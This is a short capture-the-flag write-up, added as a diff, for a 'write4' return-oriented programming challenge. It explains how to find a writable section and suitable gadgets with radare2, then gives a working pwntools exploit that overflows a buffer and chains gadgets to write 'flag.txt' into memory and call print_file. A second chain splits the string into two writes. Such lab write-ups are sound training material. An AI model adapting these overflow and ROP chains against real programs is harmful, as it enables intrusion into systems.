@@ -1,0 +1,57 @@
+In this challenge you need to write an arbitrary string to memory section, mostly data section is appropriate
+
+address for section can be found using rabin2 -S <binary> or iS in radare2 which lists all sections (you need to choose a writeable section)
+next we need a gadget like mov qword ptr [r14], r15
+
+so in radare2, type :    /R mov qword (luckily i found this otherwise i would have to search for dword and split my string)
+
+After finding the gadgets i have to first pop them off the stack so i looked for pop r14
+i found pop r14, pop r15, ret together
+
+Exploit is 
+pop r14; pop r15; ret
+addr_of_data_section
+"test.txt" // anything more or less than this string or string length wont work for ex "test.txt\0" wont work it exceeds 8 bytes
+mov qword ptr [r14] r15; ret
+
+pop rdi; ret
+addr_of_data_section
+print_file_addr
+
+from pwn import *
+
+elf = ELF("./write4")
+rop = ROP([elf])
+addr_data = p64(0x00601028)
+print_file = p64(elf.sym.print_file)
+pop = p64(rop.find_gadget(['pop rdi','ret'])[0])
+popr1415 = p64(rop.find_gadget(['pop r14','pop r15','ret'])[0])
+mov = p64(0x00400628)
+# print(mov)
+p=elf.process()
+p.recv()
+payload = b'a'*0x28 + popr1415 + addr_data + b"flag.txt" + mov + pop + addr_data + print_file
+p.sendline(payload)
+p.interactive()
+
+But if we needed to split it 
+
+Exploit is 
+
+pop r14; pop r15; ret
+addr_of_data_section
+"test" // anything more or less than this string or string length wont work for ex "test.txt\0" wont work it exceeds 8 bytes
+mov dword ptr [r14] r15; ret
+
+pop r14; pop r15; ret
+addr_of_data_section + 4
+".txt"
+mov dword ptr [r14] r15; ret
+
+pop rdi; ret
+addr_of_data_section
+print_file_addr
+
+
+
+
